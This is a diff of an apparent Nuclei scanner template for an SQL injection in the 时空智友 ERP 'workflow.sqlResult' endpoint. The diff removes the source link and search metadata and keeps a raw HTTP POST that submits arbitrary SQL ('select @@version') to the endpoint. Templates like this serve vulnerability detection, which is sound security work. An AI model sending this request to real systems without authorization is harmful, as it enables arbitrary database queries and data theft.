@@ -3,12 +3,8 @@ info:
   name: 时空智友ERP sqlResult存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xnb8060o3yb5gbf2'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xnb8060o3yb5gbf2
-    fofa: body="时空智友企业信息管理
 http:
 - raw:
   - "POST /formservice?service=workflow.sqlResult HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\nConnection: close\nContent-Length: 172\nContent-Type: application/json; charset=utf-8\nAccept-Encoding: gzip\n\n{\n  \"params\": {\n    \"hello\": \"world\"\n  },\n  \"sql\": \"select @@version\"\n}"
